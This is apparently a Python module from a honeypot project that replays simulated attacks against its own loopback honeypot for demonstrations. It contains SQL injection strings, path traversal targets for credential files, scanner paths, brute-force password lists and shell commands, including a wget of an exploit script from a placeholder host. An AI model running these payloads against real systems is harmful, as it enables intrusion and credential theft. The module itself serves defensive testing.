"""
Honeypot Nexus - Synthetic Attack Demonstration Engine
Generates realistic simulated security events strictly over local loopback (127.0.0.1:8080).
Exercises the complete real pipeline without bypassing any stage.
"""

import threading
import time
import urllib.request
import urllib.parse
import json
from dataclasses import dataclass
from typing import List, Dict, Any
from app.config import Config
from app.models.models import HoneypotEventModel, AttackerSession, AttackerProfile, DetectionModel, Alert
from app.extensions import db
from app.services.audit_service import audit_log
from app.logging_config import get_logger

logger = get_logger("app")

_DEMO_LOCK = threading.Lock()


@dataclass
class ScenarioStep:
    method: str
    path: str
    source_ip: str
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    data: Dict[str, Any] = None
    headers: Dict[str, str] = None
    delay_s: float = 0.05


def _send_step(step: ScenarioStep):
    """Sends HTTP request strictly to loopback honeypot port."""
    url = f"http://127.0.0.1:{Config.HONEYPOT_PORT}{step.path}"
    headers = {
        "User-Agent": step.user_agent,
        "X-Demo-Source-IP": step.source_ip,
        **(step.headers or {})
    }

    body_bytes = None
    if step.data:
        if step.headers and step.headers.get("Content-Type") == "application/json":
            body_bytes = json.dumps(step.data).encode("utf-8")
        else:
            body_bytes = urllib.parse.urlencode(step.data).encode("utf-8")

    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=step.method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            resp.read()
    except Exception:
        # Expected for 404, 403, 401 lures
        pass


def get_scenario_steps(scenario: str) -> List[ScenarioStep]:
    steps = []

    if scenario == "brute_force":
        ip = "203.0.113.45"
        ua = "python-requests/2.31.0"
        steps.append(ScenarioStep("GET", "/login", ip, ua))
        passwords = ["123456", "password", "admin123!", "qwerty", "letmein", "welcome1", "Passw0rd", "root"]
        for pwd in passwords:
            steps.append(ScenarioStep("POST", "/login", ip, ua, data={"username": "admin", "password": pwd}))

    elif scenario == "sqli":
        ip = "198.51.100.77"
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        sqli_payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT username,password FROM users--",
            "1; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "1' AND 1=2 UNION SELECT NULL,@@version--",
            "' OR 1=1--"
        ]
        for p in sqli_payloads:
            steps.append(ScenarioStep("GET", f"/database?table=users&q={urllib.parse.quote(p)}", ip, ua))

    elif scenario == "traversal":
        ip = "192.0.2.88"
        ua = "curl/8.4.0"
        targets = [
            "../../etc/passwd",
            "..%2f..%2f..%2fetc%2fshadow",
            "%252e%252e%252fetc%252fpasswd",
            "....//....//etc/hosts",
            "/windows/win.ini",
            "../config/network_config.conf",
            "/security/api_keys_backup.txt"
        ]
        for t in targets:
            steps.append(ScenarioStep("GET", f"/files/view?path={urllib.parse.quote(t)}", ip, ua))

    elif scenario == "scanner":
        ip = "203.0.113.200"
        ua = "sqlmap/1.7.8#stable"
        paths = [
            "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin",
            "/server-status", "/backup", "/config", "/old", "/dev",
            "/test", "/internal", "/uploads", "/admin", "/robots.txt",
            "/sitemap.xml", "/api/v1/users", "/api/v1/config", "/api/v1/admin"
        ]
        for p in paths:
            steps.append(ScenarioStep("GET", p, ip, ua))

    elif scenario == "api_enum":
        ip = "198.51.100.150"
        ua = "PostmanRuntime/7.36.0"
        steps.append(ScenarioStep("GET", "/api", ip, ua))
        for uid in range(1, 10):
            steps.append(ScenarioStep("GET", f"/api/v1/users/{uid}", ip, ua))
        steps.append(ScenarioStep("GET", "/api/v1/admin", ip, ua))
        steps.append(ScenarioStep("GET", "/api/v1/config", ip, ua))
        steps.append(ScenarioStep("GET", "/api/v1/tokens", ip, ua))
        steps.append(ScenarioStep("GET", "/api/v1/tokens", ip, ua, headers={"Authorization": "Bearer test"}))

    elif scenario == "shell":
        ip = "192.0.2.14"
        ua = "Mozilla/5.0 (X11; Linux x86_64)"
        cmds = [
            "help", "whoami", "id", "uname -a", "pwd", "ls -la",
            "cd /etc", "cat passwd", "cat shadow", "cd /home/admin",
            "cat .bash_history", "wget http://example.invalid/exploit.sh",
            "chmod +x exploit.sh", "sudo -l", "history"
        ]
        for cmd in cmds:
            steps.append(ScenarioStep("POST", "/shell/exec", ip, ua, data={"cmd": cmd}, headers={"Content-Type": "application/json"}))

    elif scenario == "mixed":
        # Full Multi-Stage Escalation Scenario
        ip = "198.51.100.77"
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        # Stage 1: Recon
        steps.append(ScenarioStep("GET", "/robots.txt", ip, ua))
        steps.append(ScenarioStep("GET", "/backup", ip, ua))
        steps.append(ScenarioStep("GET", "/.env", ip, ua))
        steps.append(ScenarioStep("GET", "/config", ip, ua))
        # Stage 2: Brute Force
        for pwd in ["12345", "password", "admin", "welcome", "admin123"]:
            steps.append(ScenarioStep("POST", "/login", ip, ua, data={"username": "admin", "password": pwd}))
        # Stage 3: SQLi
        steps.append(ScenarioStep("GET", "/database?table=users&q=' UNION SELECT username,password FROM users--", ip, ua))
        # Stage 4: Traversal & Sensitive File
        steps.append(ScenarioStep("GET", "/files/view?path=../../etc/passwd", ip, ua))
        steps.append(ScenarioStep("GET", "/files/download?path=/security/api_keys_backup.txt", ip, ua))
        # Stage 5: Shell Recon
        for cmd in ["whoami", "id", "cat /etc/shadow", "uname -a"]:
            steps.append(ScenarioStep("POST", "/shell/exec", ip, ua, data={"cmd": cmd}, headers={"Content-Type": "application/json"}))

    return steps


def run_scenario_async(scenario: str) -> int:
    """Executes a scenario in a background worker thread."""
    if not Config.DEMO_MODE:
        raise ValueError("Demo mode is disabled.")

    if not _DEMO_LOCK.acquire(blocking=False):
        raise ValueError("A simulation scenario is already running.")

    steps = get_scenario_steps(scenario)

    def _worker():
        try:
            logger.info(f"Starting simulated attack scenario '{scenario}' ({len(steps)} steps)")
            for step in steps:
                _send_step(step)
                time.sleep(step.delay_s)
            logger.info(f"Completed simulated attack scenario '{scenario}'")
            audit_log("demo.run", scenario, "success", {"events_count": len(steps)})
        finally:
            _DEMO_LOCK.release()

    t = threading.Thread(target=_worker, daemon=True, name="DemoAttackWorker")
    t.start()
    return len(steps)


def purge_synthetic_data():
    """Wipes only synthetic demonstration records from database."""
    HoneypotEventModel.query.filter_by(is_synthetic=True).delete()
    db.session.commit()
    audit_log("demo.reset", "synthetic_telemetry", "success")
